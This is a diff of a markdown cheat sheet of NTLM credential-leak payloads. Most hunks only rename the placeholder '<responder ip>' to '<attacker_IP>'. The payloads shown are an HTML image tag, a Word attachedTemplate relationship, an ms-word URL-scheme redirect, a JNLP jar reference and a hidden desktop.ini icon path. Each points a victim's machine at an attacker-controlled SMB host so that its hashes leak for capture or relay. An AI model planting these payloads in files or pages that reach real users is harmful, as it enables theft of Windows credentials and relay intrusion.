@@ -5,7 +5,7 @@
 ```html
 <!DOCTYPE html>
 <html>
-	<img src="file://<responder ip>/leak/leak.png"/>
+	<img src="file://<attacker_IP>/leak/leak.png"/>
 </html>
 ```
 
@@ -16,7 +16,7 @@ Extract `.docx` file using `7zip` or `unzip` and modify the contents in `word\_r
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<responder ip>/leak/Template.dotx" TargetMode="External"/>
+	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<attacker_IP>/leak/Template.dotx" TargetMode="External"/>
 </Relationships>
 ```
 
@@ -26,7 +26,7 @@ Using a URL handle with `ms-word:ofe|u|` scheme can trigger SMB relay.
 <!DOCTYPE html>
 <html>
 	<script>
-		location.href = 'ms-word:ofe|u|\\<responder ip>\leak\leak.docx';
+		location.href = 'ms-word:ofe|u|\\<attacker_IP>\leak\leak.docx';
 	</script>
 </html>
 ```
@@ -66,7 +66,7 @@ Name it with `.jnlp` extension.
 <?xml version="1.0" encoding="UTF-8"?>
 <jnlp spec="1.0+" codebase="" href="">
 	<resources>
-		<jar href="file://<responder ip>/leak/leak.jar"/>
+		<jar href="file://<<attacker_IP>>/leak/leak.jar"/>
 	</resources>
 	<application-desc/>
 </jnlp>
@@ -113,6 +113,11 @@ cd openMe
 echo [.ShellClassInfo] > desktop.ini
 echo IconResource=\\<attacker_IP>\snare >> desktop.ini
 attrib +s +h desktop.ini
+```
+
+```
+[.ShellClassInfo]
+IconResource=\\<attacker_IP>\snare
 ```
 
 ## 08 - Windows Media Player
